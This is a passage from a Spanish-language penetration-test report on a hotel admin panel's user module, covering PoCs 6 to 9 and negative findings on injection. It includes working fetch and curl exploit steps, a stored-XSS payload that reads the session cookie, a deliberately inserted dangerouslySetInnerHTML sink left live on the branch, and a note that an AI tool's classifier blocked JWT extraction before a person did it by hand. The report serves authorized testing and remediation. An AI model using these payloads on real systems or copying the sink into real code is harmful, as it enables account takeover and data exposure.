   //  {"id":"24d6ab8a-...","email":"owner@hotel.local","full_name":"Hotel Owner","is_active":true,"role":"owner",...},
   //  ... lista completa de los 5 administradores del sistema, incluido el owner]
   ```
   *(Evidencia: `J2-POC-6_01_O9_get_admins_sin_sesion.png` — overlay inyectado mostrando la URL exacta,
   los headers enviados (sin `Authorization`), el body de la respuesta completo y la pantalla de login de
   fondo, confirmando que no había sesión activa en esa pestaña.)*

### Resultado esperado vs. obtenido
- **Esperado:** `401`/`403` — una función que expone el roster completo de administradores (incluido el
  owner) debería, como mínimo, exigir una sesión autenticada, y en rigor debería pasar también por
  `requirePermission(ADMINS.VIEW)` como hace `getAdmins()` del lado de Next.js.
- **Obtenido:** `200 OK` con el listado completo, sin ningún header de autenticación — ni siquiera una
  cookie, solo la apikey pública que cualquiera puede leer del bundle JS servido al público.

### Impacto
Este es el hallazgo más severo de todo Vector 1 para este módulo: el guard `requirePermission(ADMINS.VIEW)`
de `getAdmins.ts` (que bloquea correctamente el acceso vía la Server Action de Next.js) **no sirve de nada**
porque la función de base de datos que respalda esa Server Action es alcanzable directamente, saltándose
Next.js por completo. Cualquier persona en internet (si el Supabase estuviera expuesto, no solo local) con
la apikey pública —que por diseño **no es secreta**— puede enumerar la lista completa de administradores
del sistema: emails, nombres completos, roles y si la cuenta está activa, **incluyendo al owner**. Esto es
reconocimiento directo de alto valor para encadenar con J2-POC-1/2/3/5: identifica exactamente qué cuenta
es el owner (necesaria para apuntar J2-POC-5) y qué cuentas administrativas existen, sin dejar ningún rastro
en los logs de la aplicación Next.js (la petición nunca pasa por `apps/panel-admin`, va directo a
PostgREST/Postgres).

### Causa raíz (para Fase 3 — J3.1 / J3.3)
Toda función `SECURITY DEFINER` expuesta por PostgREST necesita una política explícita de `GRANT`/`REVOKE
EXECUTE`. Para `get_admins()` concretamente: `REVOKE EXECUTE ON FUNCTION public.get_admins() FROM PUBLIC,
anon; GRANT EXECUTE ON FUNCTION public.get_admins() TO authenticated;` como mínimo — y, para igualar el
nivel de protección de la Server Action, añadir dentro de la propia función SQL una comprobación de que
`auth.uid()` corresponda a un usuario con rol `admin`/`owner` antes de devolver filas (defensa en
profundidad: aunque `authenticated` incluye a *cualquier* usuario logueado, no solo administradores).

---

## J2-POC-7 — Máquina de estados rota en `revokeInvitation` y `resendInvitation` (O6)

| Campo | Valor |
|---|---|
| **Vector** | Vector 3 — manipulación de parámetros / reglas de negocio (mismo patrón que J2-POC-5/O5) |
| **OWASP** | A04:2021 — Insecure Design (falta de validación de transición de estados); A01:2021 — Broken Access Control (consecuencia: una invitación `accepted` puede terminar en el borrado de una cuenta activa) |
| **Subcategoría NIST CSF 2.0** | PR.PS-01 (configuración/lógica segura de los procesos); PR.DS-10 (integridad de los datos en uso — el estado real en BD no se valida por completo antes de actuar) |
| **Origen del hallazgo** | **Real** (no introducida) — observación **O6** de `users/fase-1-diagnostico.md` §3 |
| **Componente / archivo:línea** | `apps/panel-admin/src/features/invitations/services/revokeInvitation.ts:7-36` y `.../resendInvitation.ts:10-43` (ambos `"use server"`). Ambos llaman correctamente a `requirePermission` (`ADMINS.REVOKE` y `ADMINS.INVITE` respectivamente, línea 8 y 11) — el guard de *quién* funciona — pero ninguno valida *sobre qué estado* se puede actuar: `revokeInvitation` solo rechaza `status === "revoked"` (línea 23), dejando pasar `"accepted"`; `resendInvitation` solo rechaza `status === "expired"` (línea 25), un valor que — según `fase-1-diagnostico.md` y confirmado en `getStatusInfo.ts:21` — se **calcula al vuelo en el cliente y nunca se persiste en la columna `status` de la BD**, por lo que ese chequeo nunca puede dispararse con datos reales. |
| **Commit donde se reprodujo** | `9fed57e` (rama `security/users/fase2-pocs`) |

### Precondiciones
- Sesión de `owner@hotel.local` (rol `owner`, con `admins:revoke` y `admins:invite` como cualquier admin
  con esos permisos legítimos tendría) — a diferencia de J2-POC-1/2/3/5, este hallazgo **no** depende de
  saltarse `requirePermission`: el guard de permisos funciona correctamente, el problema está en qué
  estados de la invitación acepta cada acción.
- Invitación ya **aceptada** y con cuenta activa (`j2poc3-target@hotel.local`, creada en J2-POC-3, invitación
  id `820985f2-67be-4e17-b9f0-beb60d01b9f7`, status `"accepted"`).
- Una segunda invitación ya **revocada** para la prueba de `resendInvitation` (`baseline-owner-test`,
  invitación id `9ecb72fb-4e8b-4396-893e-c27fcd1e7ea1`, status `"revoked"` tras el paso 1 de esta PoC).

### Pasos reproducibles — Parte A: `revokeInvitation` sobre una invitación `accepted`
1. Login como `owner@hotel.local` → `/admin/invitations` → pestaña "Historial" → se ubica la invitación de
   `j2poc3-target@hotel.local`, status `"accepted"`, con cuenta activa y funcional (usada en J2-POC-3 y
   J2-POC-5). Se captura el `Next-Action` real del botón "Revocar": `7fde44704de7975394b3553611471a916837ae78ce`.
2. **Uso normal de la función, no un bypass de permisos**: se llama la Server Action real, con la sesión
   legítima del owner, pidiendo revocar esa invitación `accepted`:
   ```js
   const res = await fetch('/admin/invitations', {
     method: 'POST',
     headers: {
       'Next-Action': '7fde44704de7975394b3553611471a916837ae78ce',
       'Accept': 'text/x-component',
       'Content-Type': 'text/plain;charset=UTF-8',
     },
     body: JSON.stringify(['820985f2-67be-4e17-b9f0-beb60d01b9f7']),
     credentials: 'same-origin',
   });
   // => 200 OK, {"success":true}
   ```
   *(Evidencia: `J2-POC-7_01_revoke_invitacion_accepted_borra_cuenta.png` — overlay mostrando el estado
   real ANTES de la llamada (`"accepted"`, cuenta activa), la petición exacta y la respuesta `200
   {"success":true}`.)*
3. **Verificación.** Login de nuevo como `owner@hotel.local` → `/admin/admins` → el total de administradores
   bajó de 5 a 3 (antes: `admin`, `baseline-owner-test`, `j2poc3-target`, `owner`, `pwned-j2poc1`); la cuenta
   `j2poc3-target@hotel.local` ya **no aparece en ningún lado** — `auth.admin.deleteUser(invitation.user_id)`
   se ejecutó sobre una cuenta activa con sesión usable, no sobre una invitación pendiente sin reclamar.

### Pasos reproducibles — Parte B: `resendInvitation` sobre una invitación `revoked`
1. Con la invitación de `baseline-owner-test` ya en estado `"revoked"` (revocada minutos antes como parte
   de esta misma sesión de pruebas), se captura el `Next-Action` real del botón "Reenviar invitación" sobre
   una invitación pendiente legítima (`pwned-j2poc1`): `7f60626a92af2dc6f47e881189cffa433f1241b5a7`.
2. Se reutiliza ese mismo `Next-Action` (misma Server Action, uso normal de la función, sesión legítima del
   owner) apuntando al id de la invitación **ya revocada**:
   ```js
   const res = await fetch('/admin/invitations', {
     method: 'POST',
     headers: {
       'Next-Action': '7f60626a92af2dc6f47e881189cffa433f1241b5a7',
       'Accept': 'text/x-component',
       'Content-Type': 'text/plain;charset=UTF-8',
     },
     body: JSON.stringify(['9ecb72fb-4e8b-4396-893e-c27fcd1e7ea1']),
     credentials: 'same-origin',
   });
   // => 200 OK, {"success":true}
   ```
   *(Evidencia: `J2-POC-7b_01_O6_resendInvitation_sobre_revoked.png` — overlay mostrando el estado real de
   la invitación (`"revoked"`), la petición y la respuesta `200 {"success":true}`.)*

### Resultado esperado vs. obtenido
- **Esperado:** `revokeInvitation` debería rechazar (o, como mínimo, advertir de forma distinta) revocar
  una invitación `"accepted"` cuya cuenta ya está activa — revocar una invitación y borrar una cuenta en uso
  son dos operaciones con impacto muy distinto que hoy comparten el mismo botón sin distinción de estado.
  `resendInvitation` debería rechazar reenviar sobre cualquier estado que no sea `"pending"` (o
  `"expired"` si ese valor llegara a persistirse), no solo el único valor que nunca ocurre en la práctica.
- **Obtenido:** Ambas funciones devuelven `200 {"success":true}` sin importar el estado real — `revoke`
  borró una cuenta activa con sesión usable; `resend` generó un nuevo email/token de activación válido para
  una invitación que el propio owner ya había revocado.

### Impacto
`revokeInvitation` es, en los hechos, una función de **eliminación de cuentas de administrador activas**
disfrazada de "revocar invitación pendiente" — el nombre y la UI (pestaña "Historial", no "Administradores
activos") no comunican ese alcance real, lo que facilita tanto el uso indebido intencional (un admin con
`admins:revoke` pero sin `admins:disable` puede lograr el mismo efecto que J2-POC-5 por una vía distinta:
eliminar en vez de solo desactivar) como el error operativo (revocar "la invitación" de alguien pensando
que solo invalida un link, y en realidad borrarle la cuenta con la que ya trabaja). `resendInvitation`
permite reactivar el flujo de activación de una invitación que el owner **explícitamente** revocó —
rompiendo la intención de esa revocación y generando un nuevo link de activación válido para una cuenta
que ya no debería poder crearse/recuperarse.

### Causa raíz (para Fase 3 — J3.1 / J3.3)
`revokeInvitation.ts:23` necesita exigir expresamente `status === DB_ENUMS.invitation_status.pending`
(allowlist de estados válidos) en vez de solo excluir `"revoked"` (denylist de un único estado), y además
distinguir en servidor si la invitación ya fue aceptada (tiene `user_id` con cuenta activa) para exigir una
confirmación/flujo distinto — o derechamente usar `toggleAdminStatus`/una función de borrado explícita para
ese caso. `resendInvitation.ts:25` necesita validar contra una lista de estados permitidos
(`status === "pending"`) en vez de bloquear únicamente `"expired"`, que además —como ya señala
`fase-1-diagnostico.md`— debe empezar a persistirse realmente en la columna `status` en vez de calcularse
solo en el cliente, para que cualquier chequeo basado en ese valor tenga sentido en el servidor.

---

## J2-POC-8 — XSS Stored (O11): vulnerabilidad introducida de forma controlada + robo de cookie de sesión

> **Nota metodológica (leer antes que la PoC).** `fase-1-diagnostico.md` §3 (**O11**) ya había concluido que
> el código real de este módulo **no es explotable**: React escapa `full_name`/`email` por defecto
> (`{user.full_name}`) y no existe ningún `dangerouslySetInnerHTML` en `admins-table` ni en `invitations`.
> La propia observación O11 anticipa la solución: *"probablemente requiera vulnerabilidad **introducida** en
> este módulo"* — mismo lenguaje que usa O13 para A03 en general. El enunciado del proyecto exige demostrar
> "scripts maliciosos (XSS)" mediante una PoC (objetivo 3); dado que no existe un sink real que explotar,
> esta PoC **introduce intencionalmente** un sink inseguro (`dangerouslySetInnerHTML`) en los dos puntos
> donde O11 señaló que `full_name` se renderiza, y se explota la cadena completa (ver diff "antes/después"
> más abajo).
>
> **A diferencia de lo que hubiera sido lo más "limpio" a nivel de ingeniería, el sink queda intencionalmente
> vivo en el código al cerrar esta fase** (commiteado en esta misma rama, claramente marcado con un
> comentario `VULNERABILIDAD INTRODUCIDA A PROPOSITO` en cada archivo). La razón: el enunciado exige para
> Fase 3 "Comparativa de Código (Diff de Remediación)" con trazabilidad real de Git (commits, PR) y "Prueba
> de Regresión" sobre la PoC corregida — eso requiere que exista un estado "antes" real en el historial de
> git para poder mostrar un "después" real. Si el sink se revertía ya en Fase 2, Fase 3 no tendría nada
> genuino que parchar para O11 (a diferencia de las otras 7 PoCs, que sí siguen siendo explotables hoy). El
> parche real (remover `dangerouslySetInnerHTML`, agregar CSP, validar `full_name` con Zod, revisar la
> cookie de sesión) se hace en el PR de **Fase 3**, con diff real y commit real — ver `fase-3-remediacion.md`
> cuando corresponda.

| Campo | Valor |
|---|---|
| **Vector** | Vector 2 — cliente/UI (**vulnerabilidad introducida**, no real) |
| **OWASP** | A03:2021 — Injection (Cross-Site Scripting / XSS Stored) |
| **Subcategoría NIST CSF 2.0** | PR.DS-10 (protección de la integridad de los datos en uso) — hoy en estado **No cumple** *a propósito* en este módulo mientras dure la demostración (ver §4.2 de `fase-1-diagnostico.md`, donde originalmente estaba en **Cumple**); se remedia formalmente en Fase 3. También aplica **PR.PS-01** (gestión de configuración): no hay CSP como defensa en profundidad. |
| **Origen del hallazgo** | **Introducida** — corresponde a la observación **O11** de `users/fase-1-diagnostico.md` §3, que ya identificó este módulo como "seguro por ahora, pero sin segunda capa de defensa", y que anticipó explícitamente la necesidad de una vulnerabilidad introducida para poder demostrar el patrón. Decisión de introducir la vulnerabilidad, y de dejarla viva hasta el parche de Fase 3, tomada explícitamente por el equipo (Seph), no unilateralmente por Claude. |
| **Componente / archivo:línea** | `AdminsTable.tsx:50-58` y `PermissionDrawer.tsx:41-47` (ver diff abajo) — **vigente en el código al cierre de esta fase**, se remedia en Fase 3. |
| **Commit donde se reprodujo** | Rama `security/users/fase2-pocs` — ver commit de este PR (Seph agrega el hash al mergear). |

### Precondiciones
- Mismo entorno de J2-POC-1 a J2-POC-7 (Supabase local, `panel-admin` en `:3002`).
- Acceso a Mailpit (`http://127.0.0.1:54324`), el capturador de correo local de Supabase: en vez de enviar
  los correos de invitación a un servidor SMTP real, el stack local los intercepta ahí. Se usa únicamente
  para leer el enlace de activación de la cuenta maliciosa (ningún correo real involucrado).
- Reutiliza la técnica de bypass de **J2-POC-1** (invocar `createAdminAccountAction` directamente vía
  `fetch` con el header `Next-Action`, sin pasar por el formulario de la UI) para poder fijar un
  `full_name` arbitrario sin las restricciones de UX del formulario (que en la práctica no filtran nada
  igual, según O11 — pero esto hace la PoC más directa y clara).

### Pasos reproducibles

**Paso 0 — introducir el sink inseguro.** Único paso que modifica código fuente real del repositorio. Diff
exacto aplicado — **queda vigente en el código de esta rama hasta el PR de remediación de Fase 3** (ver
nota metodológica arriba):

```diff
--- a/apps/panel-admin/src/features/admins-table/components/AdminsTable/AdminsTable.tsx
+++ b/apps/panel-admin/src/features/admins-table/components/AdminsTable/AdminsTable.tsx
@@ -47,7 +47,7 @@
             {admins?.map((user) => (
               <Table.Row key={user.id}>
-                <Table.Cell>{user.full_name}</Table.Cell>
+                <Table.Cell><span dangerouslySetInnerHTML={{ __html: user.full_name ?? "" }} /></Table.Cell>
                 <Table.Cell>{user.email}</Table.Cell>
```

```diff
--- a/apps/panel-admin/src/features/admins-table/components/PermissionDrawer/PermissionDrawer.tsx
+++ b/apps/panel-admin/src/features/admins-table/components/PermissionDrawer/PermissionDrawer.tsx
@@ -38,7 +38,11 @@
           <Drawer.Header>
             <Drawer.Heading>
-              {TEXTS.TITLE} - {admin.full_name ?? admin.email}
+              {TEXTS.TITLE} -{" "}
+              {admin.full_name ? (
+                <span dangerouslySetInnerHTML={{ __html: admin.full_name }} />
+              ) : (
+                admin.email
+              )}
             </Drawer.Heading>
```

1. **Payload.** Usando el bypass de J2-POC-1 (mismo `Next-Action` id, misma técnica), se crea una
   invitación de administrador con un `full_name` malicioso:
   ```js
   const fd = new FormData();
   fd.append('1_name', '<img src=x onerror="document.body.insertAdjacentHTML(\'afterbegin\',' +
     '\'<div style=\\\'background:red;color:white;padding:1em;font-size:1.2em;z-index:9999\\\'>\' +' +
     '\'XSS STORED EJECUTADO (J2-POC-8) - esto corrio JS arbitrario en el navegador de quien ve ' +
     'esta fila, con su sesion activa. document.cookie: \' + document.cookie + \'</div>\')">');
   fd.append('1_email', 'j2poc8-xss-v2@hotel.local');
   fd.append('0', '[null,"$K1"]');
   await fetch('/admin/invitations', {
     method: 'POST',
     headers: { 'Next-Action': '<id capturado en J2-POC-1>', 'Accept': 'text/x-component' },
     body: fd, credentials: 'same-origin',
   });
   ```
   Se usa `<img onerror=...>` (no `<script>`) porque `dangerouslySetInnerHTML` de React, igual que
   `.innerHTML` del DOM nativo, **no ejecuta** las etiquetas `<script>` insertadas así — pero sí dispara
   los manejadores de eventos (`onerror`, `onload`) de las etiquetas que inserta, que es el vector real
   usado en ataques de XSS stored contra `innerHTML`.
2. **Activación de la cuenta.** Se busca el correo de invitación en Mailpit
   (`GET /api/v1/search?query=to:j2poc8-xss-v2@hotel.local` → `GET /api/v1/message/<id>`, campo `"HTML"`)
   y se navega al enlace `GET /auth/v1/verify?token=...&type=invite&redirect_to=http://127.0.0.1:3002/auth/activate`
   para completar el flujo de registro (necesario para que `last_sign_in_at` quede fijado y la cuenta
   aparezca en `get_admins()` — ver J2-POC-6 — y por tanto en `AdminsTable`).
3. **Disparo.** Login como `owner@hotel.local` (sesión real, autenticada, con cookie de sesión activa) →
   `/admin/admins`. En el momento en que React renderiza la fila de `j2poc8-xss-v2@hotel.local`, el
   `onerror` del `<img>` roto se dispara: se inserta un banner rojo en pantalla con el texto fijo y, lo más
   relevante, el valor **real** de `document.cookie` en ese momento — leído con la sesión del *owner*, no
   la de quien creó el payload. *(Evidencia: `J2-POC-8_01_XSS_stored_cookie_theft_AdminsTable.png`.)*

### Resultado esperado vs. obtenido
- **Esperado (comportamiento del código antes de esta PoC, y al que se vuelve con el parche de Fase 3):**
  el payload se renderiza como texto plano literal (React escapa `<`, `>`, `"` automáticamente) — ningún
  JS se ejecuta, la fila simplemente muestra el string completo del `<img src=x onerror=...>` como texto
  visible, sin efecto.
- **Obtenido (con el sink introducido a propósito, vigente en el código al cierre de esta fase):** el
  payload se ejecuta como HTML/JS real en el
  navegador del **owner**, con su sesión activa, y logra leer `document.cookie` exitosamente — confirmando
  que la cookie de sesión de Supabase (`sb-127-auth-token`) **no tiene el flag `HttpOnly`** y es legible
  desde JavaScript del lado del cliente.

### Impacto
Esta PoC demuestra dos cosas encadenadas: (1) el patrón de XSS stored "clásico" que O11 identificó como
posible si el escape de React alguna vez se rompe (refactor, copy-paste de otro componente que sí usa
`dangerouslySetInnerHTML` como el visor de auditoría de Fabian, o una librería de terceros que inserte HTML
sin sanear), y (2) un hallazgo nuevo y más amplio: **la cookie de sesión del panel no es `HttpOnly`**. Esto
significa que si en el futuro apareciera *cualquier* XSS real en el panel (no solo en este módulo), el
impacto no sería "solo" ejecutar JS — sería **robo directo del token de sesión**, equivalente a comprometer
la cuenta completa de quien visualice la página, sin necesitar ningún paso adicional de descifrado. Además,
encadenado con **O7/O8** (políticas RLS permisivas en `profiles` y `user_permissions`, ver `comprobacion.md`
§7), un atacante con esa cookie robada podría hacer directamente lo que esos hallazgos describen contra
PostgREST, sin necesitar acceso a la base de datos ni a ningún JWT adicional — la cookie robada **es** la
credencial.

### Causa raíz (para Fase 3 — J3.1 / J3.2)
**Importante — el parche de esto es trabajo de Fase 3, no de este documento.** El sink introducido
(`AdminsTable.tsx:50-58`, `PermissionDrawer.tsx:41-47`) queda **intencionalmente vigente** en el código al
cierre de esta fase (ver nota metodológica arriba) para que Fase 3 tenga un diff real que mostrar. El parche
de Fase 3 consiste en:
0. **Remover `dangerouslySetInnerHTML`** de ambos archivos, volviendo a `{user.full_name}` y
   `{admin.full_name ?? admin.email}` — el código real ya hacía lo correcto antes de esta PoC (JSX escapa
   por defecto); esto no es una corrección nueva, es deshacer la vulnerabilidad introducida.

Además, como **defensa en profundidad** (para que un error futuro similar — no si, cuándo — no sea
explotable de inmediato):
1. **Content-Security-Policy** restrictiva (`script-src 'self'`, sin `unsafe-inline`) configurada en
   `next.config.js`/middleware — gratis, no requiere ningún servicio externo, y hubiera bloqueado el
   `onerror` inline de esta misma PoC aunque el sink hubiera existido de verdad.
2. **Cookie de sesión `HttpOnly`** — revisar la configuración del cliente de Supabase SSR (`@supabase/ssr`)
   usado en `panel-admin`; si el flag no está activo por defecto, es una línea de configuración, no una
   herramienta de pago.
3. **Validación de `full_name` en el servidor** (longitud máxima, charset permitido) en
   `createAdminAccountAction` — hoy solo hace `trim()` (ver O11) — con Zod, ya presente en el stack.

---

## J2-POC-9 — Políticas RLS permisivas en `profiles` y `user_permissions` (O7/O8 confirmado)

| Campo | Valor |
|---|---|
| **Vector** | Vector 1 — servidor (capa de base de datos, por debajo de Next.js — mismo patrón que J2-POC-6/O9) |
| **OWASP** | A01:2021 — Broken Access Control (las políticas RLS no filtran por usuario, dejando el control de acceso real solo en manos de `requirePermission` del lado de Next.js) |
| **Subcategoría NIST CSF 2.0** | PR.AA-05 (permisos y autorizaciones gestionados según menor privilegio); PR.DS-01 (protección de la confidencialidad de los datos en reposo) |
| **Origen del hallazgo** | **Real** (no introducida) — observaciones **O7** y **O8** de `users/fase-1-diagnostico.md` §3. |
| **Componente / archivo:línea** | Políticas RLS (`CREATE POLICY`) sobre las tablas `public.profiles` y `public.user_permissions`, definidas en las migraciones de `packages/db/supabase/migrations/` — ver `fase-1-diagnostico.md` para el archivo:línea exacto de cada política señalada en el diagnóstico. |
| **Commit donde se reprodujo** | `9fed57e` (rama `security/users/fase2-pocs`) |
| **Ejecutado por** | **Seph, manualmente** — no por Claude. Ver nota metodológica abajo. |

### Nota metodológica — por qué esta PoC no la ejecutó Claude
El paso de extraer y decodificar el JWT de la cookie de sesión activa (`sb-127-auth-token`) fue bloqueado
explícitamente por el clasificador de seguridad de la herramienta usada por Claude en esta sesión, sin
excepciones y sin rutas alternativas sugeridas. Por eso esta PoC, a diferencia de las ocho anteriores, fue
reproducida por Seph en su propio navegador y documentada aquí a partir de su evidencia.

### Precondiciones
- Sesión autenticada como `admin@hotel.local` (cuenta de bajo privilegio; al momento de esta prueba, con el
  único permiso `permissions:manage`, heredado del estado final de J2-POC-3).
- Acceso a una terminal para llamar directo a PostgREST (`http://127.0.0.1:54321`), por fuera de la app
  Next.js.

### Pasos reproducibles
1. **Extracción del JWT propio.** Desde la consola de DevTools, ya logueado como `admin@hotel.local`:
   ```js
   const raw = document.cookie.split('; ').find(c => c.startsWith('sb-127-auth-token='))?.split('=')[1];
   const json = JSON.parse(atob(decodeURIComponent(raw).replace(/^base64-/, '')));
   copy(json.access_token);
   ```
2. **Llamada directa a `profiles`**, con la `apikey` anon pública y el JWT propio como `Authorization`:
   ```bash
   curl -s "http://127.0.0.1:54321/rest/v1/profiles?select=*" \
     -H "apikey: <anon key pública de .env.local>" \
     -H "Authorization: Bearer <JWT de admin@hotel.local>"
   ```
3. **Llamada directa a `user_permissions`**, mismo patrón:
   ```bash
   curl -s "http://127.0.0.1:54321/rest/v1/user_permissions?select=*" \
     -H "apikey: <anon key pública de .env.local>" \
     -H "Authorization: Bearer <JWT de admin@hotel.local>"
   ```

### Resultado esperado vs. obtenido
- **Esperado:** `profiles` debería devolver únicamente la fila correspondiente a `admin@hotel.local`
  (`554c5cb8-ab74-4863-bdb5-c79cf24de187`); `user_permissions` debería devolver únicamente las filas cuyo
  `user_id` sea ese mismo UUID.
- **Obtenido:** `profiles` devolvió **11 registros** — todos los administradores del sistema, incluido el
  owner (`24d6ab8a-b0d5-4575-9dc9-d6712c83ed74`, `full_name: "Hotel Owner"`) y las cuentas usadas en PoCs
  anteriores (incluida la del payload XSS de J2-POC-8). `user_permissions` devolvió filas con múltiples
  `user_id` distintos — incluidos los 14 permisos completos del owner — no solo los de la sesión que hizo
  la llamada.

### Impacto
Confirma que las políticas RLS de `profiles` y `user_permissions` **no filtran por usuario**: cualquier
cuenta autenticada, sin importar su rol o permisos (en este caso, una cuenta con un solo permiso ajeno a
"ver administradores"), puede leer directamente contra PostgREST el perfil completo y el conjunto de
permisos de **cualquier** otra cuenta del sistema, incluido el owner. La única protección real contra esto
era la capa de `requirePermission()` dentro de los Server Actions de Next.js — la misma capa que J2-POC-1/2/3
ya demostraron que tiene huecos, y que de todos modos **no existe en absoluto** a nivel de PostgREST/base de
datos. Encadenado con J2-POC-8 (cookie de sesión robada vía XSS, sin `HttpOnly`), un atacante con esa cookie
robada no necesita ningún permiso de la app para enumerar a todos los administradores y sus permisos — le
basta con el JWT que ya tiene.

### Causa raíz (para Fase 3 — J3.1 / J3.3)
Las políticas RLS de ambas tablas necesitan una cláusula `USING` que compare contra `auth.uid()` — por
ejemplo, para `profiles`: `USING (auth.uid() = id OR <rol del usuario actual IN ('admin','owner')
AND <permiso explícito de ver otros perfiles>)`, y análogo para `user_permissions` filtrando por
`user_id = auth.uid()` salvo que quien consulta tenga el permiso `admins:view`/`permissions:manage`. Esto no
requiere ninguna herramienta de pago — es SQL de política RLS nativo de Postgres/Supabase, ya incluido en
el stack.

---

## J2.1 — Inyección en filtros/búsquedas (A03): hallazgo negativo, documentado por código

Como parte de J2.1 se revisó explícitamente si algún endpoint de este módulo (vistas de `admins-table` o
`invitations`) acepta parámetros de búsqueda/filtro controlados por el usuario que lleguen a una consulta
construida dinámicamente (el patrón clásico de A03:2021 — Injection). Resultado: **no se encontró superficie
de inyección en el alcance de `users`**, por las siguientes razones verificadas leyendo el código real:

- `getAdmins.ts` (línea 8): llama a `supabase.rpc(RPC_FUNCTIONS.GET_ADMINS)` **sin ningún parámetro** —
  nada que un usuario pueda controlar llega a esta consulta.
- `useAdminsFiltering.ts`: el filtrado de la tabla de administradores (por nombre/email/rol) es **100%
  del lado del cliente** vía `useMemo` sobre el array ya traído completo por `getAdmins()` — no hay ningún
  round-trip al servidor con el texto de búsqueda, por lo que no hay ninguna consulta (SQL ni RPC) que
  reciba ese input.
- `getAllInvitations.ts` y `getPendingInvitations.ts`: ambas hacen `.select("*")` (la primera) y
  `.eq(status, PENDING)` (la segunda, con un valor fijo del enum, no derivado de input) — sin ningún
  parámetro de búsqueda ni filtro controlado por el cliente.
- `get_admins()` (la función SQL, ver J2-POC-6): es `LANGUAGE sql`, estática, sin `EXECUTE`/SQL dinámico —
  no hay construcción de queries en tiempo de ejecución a partir de ningún input, por lo que tampoco hay
  vector de inyección SQL clásica ahí (el problema de esa función es de **control de acceso**, no de
  inyección — ver J2-POC-6).

**Conclusión para J2.1:** dentro del alcance exacto de Joseph (`admins-table`, `invitations`,
`admin/admins`, `admin/invitations`, `core/permissions`), A03 (Injection) no es explotable porque no existe
ningún punto donde un parámetro de búsqueda/filtro llegue a una consulta — el checklist de J2.1 queda
cubierto con este hallazgo negativo documentado, sin necesidad de una PoC de explotación porque no hay nada
que explotar en este módulo. (Otros módulos del equipo, por ejemplo donde sí haya búsquedas de texto libre
contra la base de datos, podrían tener superficie distinta — fuera del alcance de este documento.)

---

## Limitaciones de esta fase — ya cerradas

Una observación de `fase-1-diagnostico.md` no se pudo convertir en PoC automatizada por Claude dentro de
este entorno de trabajo (ver `comprobacion.md` para el histórico del paso a paso manual que se le dejó a
Seph). **Esta limitación ya se cerró:**

- **O7/O8 (RLS de `profiles` / `user_permissions`).** Requería extraer el JWT de la sesión activa
  (cookie `sb-127-auth-token`) para hacer llamadas directas a PostgREST con ese token y confirmar si las
  políticas RLS filtran correctamente por usuario. La extracción/decodificación de ese token fue bloqueada
  por el sistema de seguridad de Claude Code (clasificador automático), que indicó explícitamente no
  intentar rutas alternativas para evitarlo. **Seph lo reprodujo manualmente** — ver **J2-POC-9** arriba,
  resultado confirmado: las políticas RLS no filtran por usuario.

**O9 ya no está bloqueada** — ver J2-POC-6: se encontró y reprodujo una vía **más grave y más simple** que
la originalmente prevista en el diagnóstico (no hace falta `psql` ni ningún JWT; un `curl`/`fetch` sin
sesión alcanza).

**Vector 2 (O11, XSS) ya no está pendiente** — ver J2-POC-8: se introdujo de forma controlada, acordada
explícitamente con el equipo, un sink `dangerouslySetInnerHTML` para demostrar el patrón completo,
encadenado con un hallazgo nuevo (cookie de sesión sin `HttpOnly`). **El sink queda intencionalmente vigente
en el código de esta rama** — a diferencia de lo que se podría asumir, no se revierte en Fase 2: el parche
real (remover el sink + CSP + validación + revisión de la cookie) es, a propósito, parte del entregable de
**Fase 3** (ver nota metodológica en J2-POC-8), para que esa fase tenga un diff de remediación real y
trazabilidad de Git genuina, igual que las otras 7 PoCs.

Con J2-POC-8 y J2-POC-9 cerrados, **no queda ningún checklist de Fase 2 pendiente** dentro del alcance del
módulo `users` — tanto lo que pudo ejecutar Claude como lo que requería el paso manual de Seph (O7/O8) ya
está documentado. **Ojo:** a diferencia de las sesiones anteriores, el código de `apps/panel-admin` **sí
tiene cambios reales que commitear** en este PR (los dos archivos de J2-POC-8) — no es un PR solo de
documentación.

---

## J2.3 — Log injection: hallazgo negativo en el alcance de `users`, hallazgo real fuera de alcance

Se revisó el único punto de integración de auditoría disponible en el repo
(`packages/core/src/audit/server/logAuditEvent.ts`, usado vía `@hotel/core/audit`) y todos los `console.*`
dentro del alcance exacto de Joseph (`admins-table`, `invitations`, `core/permissions`) para confirmar si
algún valor controlado por el usuario (nombre, email) llega sin sanear a una línea de log, lo que permitiría
forjar/inyectar entradas falsas (CRLF, caracteres de control) en los logs.

**Dentro del alcance de `users`:** ningún archivo de `admins-table/` ni `invitations/` llama a
`logAuditEvent` ni a `console.log`/`console.error` con datos de usuario — de hecho, **ninguna** de las
Server Actions de este módulo (`createAdminAccountAction`, `updateUserPermissions`, `toggleAdminStatus`,
`revokeInvitation`, `resendInvitation`) registra evento alguno en `audit_logs`. No hay superficie de
inyección de logs en este módulo simplemente porque **no hay logging** — lo cual es, en sí mismo, un
hallazgo para Fase 3 (falta de trazabilidad/auditoría — PR.PS-01, DE.CM-01 — sobre acciones sensibles
como crear/revocar administradores o cambiar permisos; las 7 PoCs de este documento no habrían dejado
ningún rastro en `audit_logs` si se hubieran ejecutado contra un sistema real).

**Fuera de alcance (reportado aparte, no como PoC propia):** `packages/core/src/auth/server/loginAction.ts`
(módulo de **Autenticación**, responsabilidad de Paula, no de `users`) sí tiene un patrón de log injection
real: la línea `console.log(\`Attempting login for email: ${email}, requireAdmin: ${requireAdmin}\`)`
(línea 82) interpola directamente el email que el usuario escribió en el formulario de login, sin ninguna
sanitización, antes de haber sido validado contra la base de datos — un email con saltos de línea permitiría
forjar entradas de log falsas. La línea 125 del mismo archivo además registra el `access_token` completo de
la sesión en el log (`console.log(\`Session created for user ${user.id}: ${session?.access_token}\`)`) —
un problema de exposición de secretos en logs, no de inyección, pero igual de relevante para Fase 3. Por la
regla del proyecto de mantenerse en el alcance del propio módulo, este hallazgo no se desarrolla como PoC
en este documento — queda señalado aquí para que Paula lo evalúe en el documento de Autenticación.

---

## Anexo — Re-ejecución completa de las 8 PoCs ("Round 2") con evidencia renovada

> **Motivo.** Las capturas originales (`docs/proyecto-seguridad/users/evidencias/`) se tomaron con el panel
> de DevTools **cerrado** en varias de ellas (solo se veía la pestaña de la app, sin el panel Network
> visible). Para dejar trazabilidad inequívoca de que cada petición HTTP ocurrió realmente (método, header
> `Next-Action`, status code), se repitieron **las 8 PoCs completas, de punta a punta**, con el panel
> DevTools → pestaña **Network** visible en **todas** las capturas nuevas (capturas de pantalla de escritorio
> reales, no recortes de página). Esta segunda vuelta usa cuentas de prueba nuevas donde las originales ya
